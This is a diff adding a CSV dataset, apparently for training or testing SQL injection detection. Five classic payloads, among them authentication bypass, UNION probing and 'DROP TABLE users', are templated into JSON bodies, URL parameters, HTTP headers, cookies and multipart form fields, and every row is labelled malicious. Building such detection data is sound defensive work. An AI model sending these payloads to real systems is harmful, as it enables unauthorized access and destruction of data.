@@ -1,0 +1,146 @@
+Query,Label,variant_id,original_id,type_field,base_payload,context
+"{{""username"": ""' OR 1=1--"", ""password"": ""test""}}",1,CTX_000000,0,REST_JSON_body,' OR 1=1--,REST_JSON_body
+"{{""username"": ""admin'--"", ""password"": ""test""}}",1,CTX_000001,1,REST_JSON_body,admin'--,REST_JSON_body
+"{{""username"": ""' UNION SELECT NULL--"", ""password"": ""test""}}",1,CTX_000002,2,REST_JSON_body,' UNION SELECT NULL--,REST_JSON_body
+"{{""username"": ""1' AND '1'='1"", ""password"": ""test""}}",1,CTX_000003,3,REST_JSON_body,1' AND '1'='1,REST_JSON_body
+"{{""username"": ""'; DROP TABLE users--"", ""password"": ""test""}}",1,CTX_000004,4,REST_JSON_body,'; DROP TABLE users--,REST_JSON_body
+"{{""id"": ' OR 1=1--}}",1,CTX_000005,5,REST_JSON_body,' OR 1=1--,REST_JSON_body
+"{{""id"": admin'--}}",1,CTX_000006,6,REST_JSON_body,admin'--,REST_JSON_body
+"{{""id"": ' UNION SELECT NULL--}}",1,CTX_000007,7,REST_JSON_body,' UNION SELECT NULL--,REST_JSON_body
+"{{""id"": 1' AND '1'='1}}",1,CTX_000008,8,REST_JSON_body,1' AND '1'='1,REST_JSON_body
+"{{""id"": '; DROP TABLE users--}}",1,CTX_000009,9,REST_JSON_body,'; DROP TABLE users--,REST_JSON_body
+"{{""search"": ""' OR 1=1--"", ""limit"": 10}}",1,CTX_000010,10,REST_JSON_body,' OR 1=1--,REST_JSON_body
+"{{""search"": ""admin'--"", ""limit"": 10}}",1,CTX_000011,11,REST_JSON_body,admin'--,REST_JSON_body
+"{{""search"": ""' UNION SELECT NULL--"", ""limit"": 10}}",1,CTX_000012,12,REST_JSON_body,' UNION SELECT NULL--,REST_JSON_body
+"{{""search"": ""1' AND '1'='1"", ""limit"": 10}}",1,CTX_000013,13,REST_JSON_body,1' AND '1'='1,REST_JSON_body
+"{{""search"": ""'; DROP TABLE users--"", ""limit"": 10}}",1,CTX_000014,14,REST_JSON_body,'; DROP TABLE users--,REST_JSON_body
+"{{""filter"": ' OR 1=1--}}",1,CTX_000015,15,REST_JSON_body,' OR 1=1--,REST_JSON_body
+"{{""filter"": admin'--}}",1,CTX_000016,16,REST_JSON_body,admin'--,REST_JSON_body
+"{{""filter"": ' UNION SELECT NULL--}}",1,CTX_000017,17,REST_JSON_body,' UNION SELECT NULL--,REST_JSON_body
+"{{""filter"": 1' AND '1'='1}}",1,CTX_000018,18,REST_JSON_body,1' AND '1'='1,REST_JSON_body
+"{{""filter"": '; DROP TABLE users--}}",1,CTX_000019,19,REST_JSON_body,'; DROP TABLE users--,REST_JSON_body
+?username=' OR 1=1--&password=test,1,CTX_000020,20,URL_query_param,' OR 1=1--,URL_query_param
+?username=admin'--&password=test,1,CTX_000021,21,URL_query_param,admin'--,URL_query_param
+?username=' UNION SELECT NULL--&password=test,1,CTX_000022,22,URL_query_param,' UNION SELECT NULL--,URL_query_param
+?username=1' AND '1'='1&password=test,1,CTX_000023,23,URL_query_param,1' AND '1'='1,URL_query_param
+?username='; DROP TABLE users--&password=test,1,CTX_000024,24,URL_query_param,'; DROP TABLE users--,URL_query_param
+?search=' OR 1=1--,1,CTX_000025,25,URL_query_param,' OR 1=1--,URL_query_param
+?search=admin'--,1,CTX_000026,26,URL_query_param,admin'--,URL_query_param
+?search=' UNION SELECT NULL--,1,CTX_000027,27,URL_query_param,' UNION SELECT NULL--,URL_query_param
+?search=1' AND '1'='1,1,CTX_000028,28,URL_query_param,1' AND '1'='1,URL_query_param
+?search='; DROP TABLE users--,1,CTX_000029,29,URL_query_param,'; DROP TABLE users--,URL_query_param
+?filter=' OR 1=1--&sort=asc,1,CTX_000030,30,URL_query_param,' OR 1=1--,URL_query_param
+?filter=admin'--&sort=asc,1,CTX_000031,31,URL_query_param,admin'--,URL_query_param
+?filter=' UNION SELECT NULL--&sort=asc,1,CTX_000032,32,URL_query_param,' UNION SELECT NULL--,URL_query_param
+?filter=1' AND '1'='1&sort=asc,1,CTX_000033,33,URL_query_param,1' AND '1'='1,URL_query_param
+?filter='; DROP TABLE users--&sort=asc,1,CTX_000034,34,URL_query_param,'; DROP TABLE users--,URL_query_param
+?id=' OR 1=1--,1,CTX_000035,35,URL_query_param,' OR 1=1--,URL_query_param
+?id=admin'--,1,CTX_000036,36,URL_query_param,admin'--,URL_query_param
+?id=' UNION SELECT NULL--,1,CTX_000037,37,URL_query_param,' UNION SELECT NULL--,URL_query_param
+?id=1' AND '1'='1,1,CTX_000038,38,URL_query_param,1' AND '1'='1,URL_query_param
+?id='; DROP TABLE users--,1,CTX_000039,39,URL_query_param,'; DROP TABLE users--,URL_query_param
+User-Agent: ' OR 1=1--,1,CTX_000040,40,HTTP_header_UserAgent,' OR 1=1--,HTTP_header_UserAgent
+User-Agent: admin'--,1,CTX_000041,41,HTTP_header_UserAgent,admin'--,HTTP_header_UserAgent
+User-Agent: ' UNION SELECT NULL--,1,CTX_000042,42,HTTP_header_UserAgent,' UNION SELECT NULL--,HTTP_header_UserAgent
+User-Agent: 1' AND '1'='1,1,CTX_000043,43,HTTP_header_UserAgent,1' AND '1'='1,HTTP_header_UserAgent
+User-Agent: '; DROP TABLE users--,1,CTX_000044,44,HTTP_header_UserAgent,'; DROP TABLE users--,HTTP_header_UserAgent
+User-Agent: Mozilla/5.0 ' OR 1=1--,1,CTX_000045,45,HTTP_header_UserAgent,' OR 1=1--,HTTP_header_UserAgent
+User-Agent: Mozilla/5.0 admin'--,1,CTX_000046,46,HTTP_header_UserAgent,admin'--,HTTP_header_UserAgent
+User-Agent: Mozilla/5.0 ' UNION SELECT NULL--,1,CTX_000047,47,HTTP_header_UserAgent,' UNION SELECT NULL--,HTTP_header_UserAgent
+User-Agent: Mozilla/5.0 1' AND '1'='1,1,CTX_000048,48,HTTP_header_UserAgent,1' AND '1'='1,HTTP_header_UserAgent
+User-Agent: Mozilla/5.0 '; DROP TABLE users--,1,CTX_000049,49,HTTP_header_UserAgent,'; DROP TABLE users--,HTTP_header_UserAgent
+User-Agent: ' OR 1=1-- Chrome/90.0,1,CTX_000050,50,HTTP_header_UserAgent,' OR 1=1--,HTTP_header_UserAgent
+User-Agent: admin'-- Chrome/90.0,1,CTX_000051,51,HTTP_header_UserAgent,admin'--,HTTP_header_UserAgent
+User-Agent: ' UNION SELECT NULL-- Chrome/90.0,1,CTX_000052,52,HTTP_header_UserAgent,' UNION SELECT NULL--,HTTP_header_UserAgent
+User-Agent: 1' AND '1'='1 Chrome/90.0,1,CTX_000053,53,HTTP_header_UserAgent,1' AND '1'='1,HTTP_header_UserAgent
+User-Agent: '; DROP TABLE users-- Chrome/90.0,1,CTX_000054,54,HTTP_header_UserAgent,'; DROP TABLE users--,HTTP_header_UserAgent
+Referer: http://site.com?id=' OR 1=1--,1,CTX_000055,55,HTTP_header_Referer,' OR 1=1--,HTTP_header_Referer
+Referer: http://site.com?id=admin'--,1,CTX_000056,56,HTTP_header_Referer,admin'--,HTTP_header_Referer
+Referer: http://site.com?id=' UNION SELECT NULL--,1,CTX_000057,57,HTTP_header_Referer,' UNION SELECT NULL--,HTTP_header_Referer
+Referer: http://site.com?id=1' AND '1'='1,1,CTX_000058,58,HTTP_header_Referer,1' AND '1'='1,HTTP_header_Referer
+Referer: http://site.com?id='; DROP TABLE users--,1,CTX_000059,59,HTTP_header_Referer,'; DROP TABLE users--,HTTP_header_Referer
+Referer: ' OR 1=1--,1,CTX_000060,60,HTTP_header_Referer,' OR 1=1--,HTTP_header_Referer
+Referer: admin'--,1,CTX_000061,61,HTTP_header_Referer,admin'--,HTTP_header_Referer
+Referer: ' UNION SELECT NULL--,1,CTX_000062,62,HTTP_header_Referer,' UNION SELECT NULL--,HTTP_header_Referer
+Referer: 1' AND '1'='1,1,CTX_000063,63,HTTP_header_Referer,1' AND '1'='1,HTTP_header_Referer
+Referer: '; DROP TABLE users--,1,CTX_000064,64,HTTP_header_Referer,'; DROP TABLE users--,HTTP_header_Referer
+Referer: http://evil.com/' OR 1=1--,1,CTX_000065,65,HTTP_header_Referer,' OR 1=1--,HTTP_header_Referer
+Referer: http://evil.com/admin'--,1,CTX_000066,66,HTTP_header_Referer,admin'--,HTTP_header_Referer
+Referer: http://evil.com/' UNION SELECT NULL--,1,CTX_000067,67,HTTP_header_Referer,' UNION SELECT NULL--,HTTP_header_Referer
+Referer: http://evil.com/1' AND '1'='1,1,CTX_000068,68,HTTP_header_Referer,1' AND '1'='1,HTTP_header_Referer
+Referer: http://evil.com/'; DROP TABLE users--,1,CTX_000069,69,HTTP_header_Referer,'; DROP TABLE users--,HTTP_header_Referer
+X-Forwarded-For: ' OR 1=1--,1,CTX_000070,70,HTTP_header_XForwardedFor,' OR 1=1--,HTTP_header_XForwardedFor
+X-Forwarded-For: admin'--,1,CTX_000071,71,HTTP_header_XForwardedFor,admin'--,HTTP_header_XForwardedFor
+X-Forwarded-For: ' UNION SELECT NULL--,1,CTX_000072,72,HTTP_header_XForwardedFor,' UNION SELECT NULL--,HTTP_header_XForwardedFor
+X-Forwarded-For: 1' AND '1'='1,1,CTX_000073,73,HTTP_header_XForwardedFor,1' AND '1'='1,HTTP_header_XForwardedFor
+X-Forwarded-For: '; DROP TABLE users--,1,CTX_000074,74,HTTP_header_XForwardedFor,'; DROP TABLE users--,HTTP_header_XForwardedFor
+"X-Forwarded-For: 192.168.1.1, ' OR 1=1--",1,CTX_000075,75,HTTP_header_XForwardedFor,' OR 1=1--,HTTP_header_XForwardedFor
+"X-Forwarded-For: 192.168.1.1, admin'--",1,CTX_000076,76,HTTP_header_XForwardedFor,admin'--,HTTP_header_XForwardedFor
+"X-Forwarded-For: 192.168.1.1, ' UNION SELECT NULL--",1,CTX_000077,77,HTTP_header_XForwardedFor,' UNION SELECT NULL--,HTTP_header_XForwardedFor
+"X-Forwarded-For: 192.168.1.1, 1' AND '1'='1",1,CTX_000078,78,HTTP_header_XForwardedFor,1' AND '1'='1,HTTP_header_XForwardedFor
+"X-Forwarded-For: 192.168.1.1, '; DROP TABLE users--",1,CTX_000079,79,HTTP_header_XForwardedFor,'; DROP TABLE users--,HTTP_header_XForwardedFor
+session=' OR 1=1--,1,CTX_000080,80,Cookie,' OR 1=1--,Cookie
+session=admin'--,1,CTX_000081,81,Cookie,admin'--,Cookie
+session=' UNION SELECT NULL--,1,CTX_000082,82,Cookie,' UNION SELECT NULL--,Cookie
+session=1' AND '1'='1,1,CTX_000083,83,Cookie,1' AND '1'='1,Cookie
+session='; DROP TABLE users--,1,CTX_000084,84,Cookie,'; DROP TABLE users--,Cookie
+user_id=' OR 1=1--; session=abc123,1,CTX_000085,85,Cookie,' OR 1=1--,Cookie
+user_id=admin'--; session=abc123,1,CTX_000086,86,Cookie,admin'--,Cookie
+user_id=' UNION SELECT NULL--; session=abc123,1,CTX_000087,87,Cookie,' UNION SELECT NULL--,Cookie
+user_id=1' AND '1'='1; session=abc123,1,CTX_000088,88,Cookie,1' AND '1'='1,Cookie
+user_id='; DROP TABLE users--; session=abc123,1,CTX_000089,89,Cookie,'; DROP TABLE users--,Cookie
+auth=' OR 1=1--; path=/,1,CTX_000090,90,Cookie,' OR 1=1--,Cookie
+auth=admin'--; path=/,1,CTX_000091,91,Cookie,admin'--,Cookie
+auth=' UNION SELECT NULL--; path=/,1,CTX_000092,92,Cookie,' UNION SELECT NULL--,Cookie
+auth=1' AND '1'='1; path=/,1,CTX_000093,93,Cookie,1' AND '1'='1,Cookie
+auth='; DROP TABLE users--; path=/,1,CTX_000094,94,Cookie,'; DROP TABLE users--,Cookie
+token=' OR 1=1--,1,CTX_000095,95,Cookie,' OR 1=1--,Cookie
+token=admin'--,1,CTX_000096,96,Cookie,admin'--,Cookie
+token=' UNION SELECT NULL--,1,CTX_000097,97,Cookie,' UNION SELECT NULL--,Cookie
+token=1' AND '1'='1,1,CTX_000098,98,Cookie,1' AND '1'='1,Cookie
+token='; DROP TABLE users--,1,CTX_000099,99,Cookie,'; DROP TABLE users--,Cookie
+"Content-Disposition: form-data; name=""username""
+
+' OR 1=1--",1,CTX_000100,100,Multipart_form,' OR 1=1--,Multipart_form
+"Content-Disposition: form-data; name=""username""
+
+admin'--",1,CTX_000101,101,Multipart_form,admin'--,Multipart_form
+"Content-Disposition: form-data; name=""username""
+
+' UNION SELECT NULL--",1,CTX_000102,102,Multipart_form,' UNION SELECT NULL--,Multipart_form
+"Content-Disposition: form-data; name=""username""
+
+1' AND '1'='1",1,CTX_000103,103,Multipart_form,1' AND '1'='1,Multipart_form
+"Content-Disposition: form-data; name=""username""
+
+'; DROP TABLE users--",1,CTX_000104,104,Multipart_form,'; DROP TABLE users--,Multipart_form
+"Content-Disposition: form-data; name=""file""; filename=""' OR 1=1--""
+
+data",1,CTX_000105,105,Multipart_form,' OR 1=1--,Multipart_form
+"Content-Disposition: form-data; name=""file""; filename=""admin'--""
+
+data",1,CTX_000106,106,Multipart_form,admin'--,Multipart_form
+"Content-Disposition: form-data; name=""file""; filename=""' UNION SELECT NULL--""
+
+data",1,CTX_000107,107,Multipart_form,' UNION SELECT NULL--,Multipart_form
+"Content-Disposition: form-data; name=""file""; filename=""1' AND '1'='1""
+
+data",1,CTX_000108,108,Multipart_form,1' AND '1'='1,Multipart_form
+"Content-Disposition: form-data; name=""file""; filename=""'; DROP TABLE users--""
+
+data",1,CTX_000109,109,Multipart_form,'; DROP TABLE users--,Multipart_form
+"Content-Disposition: form-data; name=""comment""
+
+' OR 1=1--",1,CTX_000110,110,Multipart_form,' OR 1=1--,Multipart_form
+"Content-Disposition: form-data; name=""comment""
+
+admin'--",1,CTX_000111,111,Multipart_form,admin'--,Multipart_form
+"Content-Disposition: form-data; name=""comment""
+
+' UNION SELECT NULL--",1,CTX_000112,112,Multipart_form,' UNION SELECT NULL--,Multipart_form
+"Content-Disposition: form-data; name=""comment""
+
+1' AND '1'='1",1,CTX_000113,113,Multipart_form,1' AND '1'='1,Multipart_form
+"Content-Disposition: form-data; name=""comment""
+
+'; DROP TABLE users--",1,CTX_000114,114,Multipart_form,'; DROP TABLE users--,Multipart_form
